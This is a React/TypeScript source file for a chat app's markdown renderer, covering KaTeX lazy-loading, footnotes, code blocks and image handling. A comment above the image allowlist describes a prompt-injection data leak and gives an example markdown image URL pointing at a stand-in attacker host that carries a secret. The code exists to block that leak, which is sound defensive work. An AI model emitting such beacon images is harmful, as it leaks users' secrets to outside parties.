import { useUiText } from "../../lib/ui-text"
import { useEffect, useId, useState } from 'react'
import ReactMarkdown from 'react-markdown'
import remarkGfm from 'remark-gfm'
import remarkMath from 'remark-math'
import 'katex/dist/katex.min.css'
import { MATH_OPTIONS, chatContentNeedsKatex } from '../../lib/markdown-math'
import { remarkChatMath } from '../../lib/remark-chat-math'
import { CodeBlock, isHtmlSnippet } from './CodeBlock'
import { parseChatQuestionJson } from '../../lib/chat-question'
import { InlineHtmlPreview } from './InlineHtmlPreview'
import { rehypeColorSwatches, remarkVisualHtml } from '../../lib/markdown-colors'
import { codeBlockText } from '../../lib/markdown-code'
import { openExternal } from '../../api/backend'
import { useComfyViewRescue, isInlineVideoUrl } from './comfyViewRescue'
import { log } from '../../lib/logger'
import type { Components, Options } from 'react-markdown'
import type { Root as HtmlRoot } from 'hast'
import { visit } from 'unist-util-visit'
import { ExternalImagePreview } from './ExternalImagePreview'
import { isDirectImageLink, remoteImageUrl } from '../../lib/external-image-preview'

interface Props {
  content: string
}

// M7 / Audit W-T2 — rehype-katex zieht KaTeX (455 kB) hinter sich her und war
// damit fast die Hälfte des Boot-Chunks, obwohl die meisten Unterhaltungen nie
// eine Formel enthalten. Deshalb wird das Plugin erst geholt, wenn der Text
// wirklich Math-Syntax enthält (contentNeedsKatex, siehe lib/markdown-math.ts:
// bewiesene Obermenge, kein Heuristik-Raten).
//
// Das Stylesheet bleibt absichtlich ein statischer Import: es sind ~23 kB CSS,
// und nachgeladenes CSS hieße, dass eine fertig gesetzte Formel für einen
// Moment unformatiert steht. Nur der JS-Brocken wandert.
type RehypePlugins = NonNullable<Options['rehypePlugins']>
type KatexPlugin = RehypePlugins[number]

let katexPlugin: KatexPlugin | null = null
let katexLoad: Promise<void> | null = null

function loadKatex(): Promise<void> {
  katexLoad ??= import('rehype-katex').then(
    (m) => { katexPlugin = m.default },
    (err: unknown) => {
      // Nachladen gescheitert (offline, kaputter Cache): der Rest der Nachricht
      // wird weiter gerendert, die Formel bleibt als Quelltext stehen. Ein
      // erneuter Versuch ist erlaubt, darum das Promise wieder freigeben.
      katexLoad = null
      log.warn('[markdown] KaTeX did not load; formulas stay as source text', { error: err })
    },
  )
  return katexLoad
}

/**
 * Liefert die rehype-Plugin-Liste für diesen Text und stößt das Nachladen an,
 * sobald der Text zum ersten Mal Math enthält. Solange der Brocken unterwegs
 * ist, rendert der Text ganz normal — nur die Formel steht noch als Quelltext.
 * Beim Streamen ist das der Bruchteil zwischen dem ersten `$$` und dem Rest der
 * Formel; danach hält das Modul-Singleton das Plugin für alle weiteren
 * Nachrichten bereit, ohne erneutes Laden.
 */
function useRehypePlugins(content: string): RehypePlugins {
  const needsKatex = chatContentNeedsKatex(content)
  const [katexReady, setKatexReady] = useState(() => katexPlugin !== null)

  useEffect(() => {
    if (!needsKatex || katexReady) return
    let alive = true
    void loadKatex().then(() => { if (alive && katexPlugin) setKatexReady(true) })
    return () => { alive = false }
  }, [needsKatex, katexReady])

  return needsKatex && katexReady && katexPlugin ? [katexPlugin, rehypeColorSwatches] : [rehypeColorSwatches]
}

function rehypeFootnoteLabels(prefix: string) {
  return (tree: HtmlRoot) => {
    visit(tree, 'element', node => {
      if (node.properties.id === 'footnote-label') node.properties.id = prefix + 'footnote-label'
      if (node.properties.dataFootnoteRef === true) node.properties.ariaDescribedBy = [prefix + 'footnote-label']
    })
  }
}

// Assistant output can embed images via markdown `![](url)`. Auto-loading an
// arbitrary remote URL turns the renderer into a data-exfil beacon — a model
// (or a poisoned doc/tool-result it summarizes) emits
// `![](https://attacker.example/track?d=<secret>)` and the webview fires the GET
// on render, no script needed. So only auto-load from hosts we already trust
// (the same set the CSP img-src pins); anything else becomes a click-to-open
// link instead of a silent fetch. Belt-and-suspenders with the pinned CSP.
function isTrustedImageSrc(src: string): boolean {
  if (src.startsWith('data:image/')) return true
  if (src.startsWith('blob:')) return true
  let u: URL
  try {
    u = new URL(src)
  } catch {
    return false
  }
  if (u.protocol !== 'https:' && u.protocol !== 'http:') return false
  const h = u.hostname.toLowerCase()
  if (h === 'localhost' || h === '127.0.0.1') return true // local engine previews
  if (h === 'lrrhheztdytyfpizvuup.supabase.co') return true // LU cloud storage
  if (h === 'civitai.com' || h.endsWith('.civitai.com')) return true
  if (h.endsWith('.githubusercontent.com')) return true
  return false
}

/** A picture in a reply. A model often repeats the ComfyUI /view address of a
 *  picture it just made, and on the desktop that direct load is blocked the
 *  same way the tool block's was (comfyViewRescue.ts), so it gets the same
 *  rescue. Every other picture loads as before. */
function ChatImage({ src, alt }: { src: string; alt: string }) {
  const uiText = useUiText()

  const [failed, setFailed] = useState(false)
  const rescued = useComfyViewRescue(src, failed)
  // A clip the model links the same way (`![clip](…/view?filename=x.mp4…)`)
  // plays here instead of standing as a broken picture (3.0.8 A1).
  if (isInlineVideoUrl(src)) {
    return <video src={rescued ?? src} aria-label={alt || uiText("Video")} controls loop playsInline preload="metadata" onError={() => setFailed(true)} className="block max-w-full max-h-[320px] rounded-md my-2" />
  }
  return <img src={rescued ?? src} alt={alt} loading="lazy" onError={() => setFailed(true)} className="max-w-full rounded-md my-2" />
}

const components: Components = {
  pre({ children }) { return <div className="min-w-0 max-w-full">{children}</div> },
  code({ className, children, ...props }) {
    const match = /language-([^\s]+)/.exec(className || '')
    const isBlock = match || (typeof children === 'string' && children.includes('\n'))

    if (isBlock) {
      // Coerce through the helper, never through a bare cast: an empty fence
      // arrives as undefined and used to print the word "undefined" in a code
      // box, which is what every code block looks like for the moment between
      // its opening fence and its first character. Live capture and the shapes
      // it has to survive are in lib/markdown-code.ts.
      const code = codeBlockText(children)
      if (match?.[1] === 'studio-question') {
        const clarification = parseChatQuestionJson(code)
        if (clarification) return <p className="mb-3 whitespace-pre-wrap leading-relaxed">{clarification.question}</p>
      }
      return isHtmlSnippet(code, match?.[1]) ? <InlineHtmlPreview code={code} language={match?.[1]} /> : <CodeBlock code={code} language={match?.[1]} />
    }

    return (
      <code className="bg-gray-200 dark:bg-white/10 px-1.5 py-0.5 rounded text-gray-800 dark:text-gray-200 text-sm font-mono" {...props}>
        {children}
      </code>
    )
  },
  p({ children }) {
    return <p className="mb-3 leading-relaxed">{children}</p>
  },
  h1({ children }) {
    return <h1 className="text-xl font-bold mb-3 text-gray-900 dark:text-white">{children}</h1>
  },
  h2({ children }) {
    return <h2 className="text-lg font-bold mb-2 text-gray-900 dark:text-white">{children}</h2>
  },
  h3({ children }) {
    return <h3 className="text-base font-semibold mb-2 text-gray-900 dark:text-white">{children}</h3>
  },
  h4({ children }) {
    return <h4 className="font-semibold mb-2">{children}</h4>
  },
  h5({ children }) {
    return <h5 className="text-sm font-semibold mb-2">{children}</h5>
  },
  h6({ children }) {
    return <h6 className="text-xs font-semibold mb-2">{children}</h6>
  },
  hr() {
    return <hr className="my-4 border-gray-200 dark:border-white/15" />
  },
  ul({ children }) {
    return <ul className="list-disc list-outside pl-6 mb-3 space-y-1">{children}</ul>
  },
  ol({ children, start }) {
    return <ol start={start} className="list-decimal list-outside pl-6 mb-3 space-y-1">{children}</ol>
  },
  blockquote({ children }) {
    return (
      <blockquote className="border-l-2 border-gray-300 dark:border-white/20 pl-4 my-3 text-gray-500 dark:text-gray-400 italic">
        {children}
      </blockquote>
    )
  },
  table({ children }) {
    return (
      <div className="markdown-table min-w-0 max-w-full overflow-x-auto my-3">
        <table className="w-full border-collapse border border-gray-200 dark:border-white/10 text-sm">{children}</table>
      </div>
    )
  },
  th({ children, style }) {
    return <th style={style} className="border border-gray-200 dark:border-white/10 px-3 py-2 bg-gray-100 dark:bg-white/5 text-left font-semibold">{children}</th>
  },
  td({ children, style }) {
    return <td style={style} className="border border-gray-200 dark:border-white/10 px-3 py-2">{children}</td>
  },
  a({ href, children, node, id, 'aria-describedby': description, 'aria-label': label }) {
    if (href?.startsWith('#') && node && ('dataFootnoteRef' in node.properties || 'dataFootnoteBackref' in node.properties)) {
      return (
        <a id={id} href={href} aria-describedby={description} aria-label={label}
          className="text-blue-600 dark:text-blue-400 hover:underline"
          onClick={event => {
            event.preventDefault()
            document.getElementById(href.slice(1))?.scrollIntoView({ block: 'nearest' })
          }}>
          {children}
        </a>
      )
    }
    if (href && isDirectImageLink(href)) return <ExternalImagePreview key={href} src={href} alt={typeof children === 'string' ? children : 'Imagem encontrada na internet'} />
    // Linked markdown images already have their own preview controls.
    if (node?.children.some(child => child.type === 'element' && child.tagName === 'img')) return <span>{children}<button type="button" onClick={() => { if (href) void openExternal(href) }} className="text-blue-600 dark:text-blue-400 hover:underline">Abrir página de origem ↗</button></span>
    return (
      <a
        href={href}
        onClick={(e) => { e.preventDefault(); if (href) void openExternal(href) }}
        className="text-blue-600 dark:text-blue-400 hover:underline cursor-pointer [overflow-wrap:anywhere]"
      >
        {children}
      </a>
    )
  },

  img({ src, alt }) {
    const s = typeof src === 'string' ? src : ''
    if (s && isTrustedImageSrc(s)) {
      return <ChatImage src={s} alt={alt ?? ''} />
    }
    if (remoteImageUrl(s)) return <ExternalImagePreview key={s} src={s} alt={alt ?? ''} />
    // Untrusted host — do not silently fetch. Offer an explicit click instead.
    return (
      <button
        onClick={(e) => { e.preventDefault(); if (s) openExternal(s) }}
        className="text-blue-600 dark:text-blue-400 hover:underline cursor-pointer inline"
        title={s}
      >
        🖼 {alt || 'Imagem'} (abrir externamente)
      </button>
    )
  },
}

export function MarkdownRenderer({ content }: Props) {
  const rehypePlugins = useRehypePlugins(content)
  const footnotePrefix = 'chat-' + useId() + '-'
  const uiText = useUiText()
  return (
    <div className="markdown-content text-left whitespace-normal min-w-0 max-w-full [overflow-wrap:anywhere] text-gray-800 dark:text-gray-200">
      <ReactMarkdown
        remarkPlugins={[remarkGfm, [remarkMath, MATH_OPTIONS], remarkChatMath, remarkVisualHtml]}
        remarkRehypeOptions={{ clobberPrefix: footnotePrefix, footnoteLabel: uiText("Footnotes"), footnoteBackLabel: () => uiText("Back to reference") }}
        rehypePlugins={[[rehypeFootnoteLabels, footnotePrefix], ...rehypePlugins]}
        components={components}
      >
        {content}
      </ReactMarkdown>
    </div>
  )
}
